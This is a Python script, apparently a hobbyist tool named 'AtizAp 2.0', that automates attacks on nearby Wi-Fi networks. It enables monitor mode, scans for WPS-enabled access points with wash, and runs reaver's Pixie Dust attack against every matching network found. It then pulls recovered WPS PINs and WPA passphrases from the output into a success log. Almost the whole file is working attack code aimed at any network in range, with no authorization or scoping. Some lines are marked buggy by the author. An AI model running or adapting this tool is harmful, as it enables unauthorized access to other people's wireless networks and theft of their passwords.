import re 
import subprocess 
import glob 
import os
import time

arquivo_txt = "wash.txt"

ENDC = '\033[m' # reset
RED = '\033[91m'
GREEN = '\033[92m' 
BLUE = '\033[94m' 
YELLOW = '\033[93m'

lista_bssid = []
lista_canal = []
lista_dbm = []
lista_wps = []
lista_lck = []
lista_vendor = []
lista_essid = []


def wash():
    print(f"[{YELLOW}+{ENDC}]Rodando airmon-ng \n")
    subprocess.run("sudo airmon-ng start wlan1", shell=True, universal_newlines=True, stdout=subprocess.DEVNULL)
    print(f"[{YELLOW}+{ENDC}]airmon-ng concluído \n")
    print(f"[{YELLOW}+{ENDC}]Rodando wash \n")
    subprocess.run("sudo timeout 30s wash -F -i wlan1mon | tee wash.txt", shell=True, universal_newlines=True)
    print(f"[{YELLOW}+{ENDC}]Wash concluído \n")

def limparArquivo_executar():
    print(f"[{YELLOW}+{ENDC}]procurando redes vulneraveis... \n")
    with open(arquivo_txt, 'r') as arquivo:
        for _ in range(2):
            arquivo.readline()
        with open('chipsets.txt', 'r') as chipsets:
            lista_chipsets = [line.strip() for line in chipsets]
        for linha in arquivo:
            if any(chipset in linha for chipset in lista_chipsets):
                partes = linha.split()

                lista_bssid.append(partes[0])
                lista_canal.append(partes[1])
                lista_dbm.append(partes[2])
                lista_wps.append(partes[3])
                lista_lck.append(partes[4])
                lista_vendor.append(partes[5])
                lista_essid.append(partes[6])
                
    print(f"[{YELLOW}+{ENDC}]foi encontrado {len(lista_bssid)} redes com vunerabilidade WPS!! \n")
    redes_bom_dbm = []
    redes_ruim_dbm = []
    

    for i in range(len(lista_essid)):
        if int(lista_dbm[i]) < -75:
            redes_ruim_dbm.append(i)
        else:
            redes_bom_dbm.append(i)
    
    print(f"[{YELLOW}+{ENDC}]Redes com dbm < -75: {len(redes_ruim_dbm)} | Redes com dbm >= -75: {len(redes_bom_dbm)}\n")
    
    for i in redes_bom_dbm:
        print(f"[{YELLOW}lista{ENDC}]-{GREEN} {lista_essid[i]}, {lista_dbm[i]} dBm{ENDC}")
    print("\n")
    
    for i in redes_ruim_dbm:
        print(f"[{YELLOW}lista{ENDC}]- {lista_essid[i]}, {RED}{lista_dbm[i]} dBm{ENDC}")

    
    for i in redes_bom_dbm:
        print(f"[{YELLOW}+{ENDC}]Rodando reaver para a rede:{BLUE} {lista_essid[i]}...\n{ENDC}")
        comando = f"sudo timeout 30s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1  > redeB{i}.txt"
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL)
        #bugado
        os.system(GREEN + f"grep -i 'WPA PSK' redeB{lista_essid[i]}.txt" + ENDC)
    
    for i in redes_ruim_dbm:
        print(f"[{YELLOW}+{ENDC}]Rodando reaver para a rede:{BLUE} {lista_essid[i]}...\n{ENDC}")
        comando = f"sudo timeout 25s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1  > redeR{i}.txt"
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL)
        #Bugado
        os.system(GREEN + f"grep -i 'WPA PSK' redeR{i}.txt" + ENDC)

   #for i in range(len(lista_bssid)):
    #    print(f"Rodando reaver para a rede numero {i+1}, {lista_essid[i]}...\n")
    #    comando = f"sudo timeout 40s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1 -vvv > rede{i}.txt"
    #    subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL)

#Loucura.inicio()
def analizarResultados():
    pattern1 = re.compile(r"send_packet called from resend_last_packet()")
    pattern2 = re.compile(r"[+] Associated with")
    pattern3 = re.compile(r"WPS PIN:")
    pattern4 = re.compile(r"WPA PSK:")
    pattern5 = re.compile(r"AP SSID:")

    for filename in glob.glob("rede*.txt"):
        with open(filename, 'r') as f:
            found_pattern1 = False
            found_pattern2 = False
            found_wps_pin = False
            found_wpa_psk = False
            found_ap_ssid = False
            wps_pin = ""
            wpa_psk = ""
            ap_ssid = ""
            falha_ssid = ""
            erro_por = ""
            for line in f:
                if pattern1.search(line):
                    found_pattern1 = True
                    erro_por = line.strip()
                if pattern2.search(line):
                    found_pattern2 = True
                    falha_ssid = line.strip()
                if pattern3.search(line):
                    found_wps_pin = True
                    wps_pin = line.strip()
                if pattern4.search(line):
                    found_wpa_psk = True
                    wpa_psk = line.strip()
                if pattern5.search(line):
                    found_ap_ssid = True
                    ap_ssid = line.strip()
            if found_wps_pin and found_wpa_psk:
                with open('./logs/sucesso.log', 'a') as log:
                    log.write(f"Sucesso em {filename}\n")
                    log.write(f"WPS PIN: {wps_pin}\n")
                    log.write(f"WPA PSK: {wpa_psk}\n")
                    log.write(f"BSSID: {falha_ssid}\n")
                    log.write(f"AP SSID: {ap_ssid}\n \n")
            else:
                with open('./logs/falha.log', 'a') as falha:
                    falha.write(f"Falha em {filename}\n")
                    falha.write(f"Erro >> {erro_por}\n")
                    falha.write(f"SSID: {falha_ssid}\n \n")
#Loucura.fim()

if __name__ == "__main__":
    os.system('clear')
    os.system('rm -fr rede*.txt')
    print(GREEN+"""███████╗ ████████╗██╗███████╗ █████╗ ██████╗ 
██╔══██╗╚══██╔══╝██║╚══███╔╝██╔══██╗██╔══██╗
███████║   ██║   ██║  ███╔╝ ███████║██████╔╝
██╔══██║   ██║   ██║ ███╔╝  ██╔══██║██╔═══╝ 
██║  ██║   ██║   ██║███████╗██║  ██║██║     
╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝╚═╝    """)
    print("""
         ██████╗     ██████╗ 
         ╚════██╗   ██╔═████╗
          █████╔╝   ██║██╔██║
         ██╔═══╝    ████╔╝██║
         ███████╗██╗╚██████╔╝
         ╚══════╝╚═╝ ╚═════╝ """+ENDC)
    print(BLUE+"-------------------------------------")
    print("|       Feito por fezin 2024        |")
    print("|                                   |")
    print("|  https://github.com/fezinhopatta  |")
    print("-------------------------------------"+ENDC)
    wash()
    limparArquivo_executar()
    print("Analizando resultados \n")
    analizarResultados()
    os.system('cat ./logs/sucesso.log')
    os.system('./fazedor_backup.sh')
